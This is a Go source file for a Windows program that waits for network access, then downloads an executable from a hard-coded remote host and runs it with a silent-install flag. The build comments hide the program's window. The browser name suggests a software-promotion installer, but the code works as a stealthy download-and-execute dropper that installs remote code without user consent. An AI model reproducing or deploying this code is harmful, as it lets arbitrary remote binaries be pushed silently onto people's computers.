package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"time"
)

func writeLog(msg string) {
	f, err := os.Create("c:/qzbrower.log")
	if err != nil {
		return
	}
	defer f.Close()

	f.WriteString(time.Now().Format("2006-01-02 15:04:05 ") + msg + "\n")
}

func checkHaveNet() {
	tc := time.NewTicker(time.Second)
	for {
		<-tc.C
		conn, err := net.Dial("udp", "www.baidu.com:80")
		if err == nil {
			conn.Close()
			break
		}
	}
}

func main() {
	checkHaveNet()
	path := flag.String("-f", "", "默认下载路径")
	flag.Parse()

	if *path == "" {
		*path = "c:/"
	}

	fileName := fmt.Sprintf("%s/qzbrower.exe", *path)

	//res, err := http.Get("http://www.f-young.cn/activity/campusDown/QianZhaoBrowserSetup.exe")
	res, err := http.Get("http://qianzhao.221su.com:9090/app?q=MQ%3D%3D&t=Mg%3D%3D&v=MS4wLjA%3D")

	if err != nil {
		writeLog("下载文件失败 " + err.Error())
		return
	}
	if res.Body != nil {
		defer res.Body.Close()
	}

	data, err := ioutil.ReadAll(res.Body)
	if err != nil {
		writeLog("读取数据错误 " + err.Error())
		return
	}

	err = ioutil.WriteFile(fileName, data, os.ModePerm)
	if err != nil {
		writeLog("写入文件失败 " + err.Error())
		return
	}

	cmd := exec.Command(fileName, "/S")
	cmd.Run()
	//go build -ldflags -H=windowsgui XXX.go
	//GOOS=windows GOARCH=386 go build -ldflags "-s -w" -H=windowsgui download.go
}
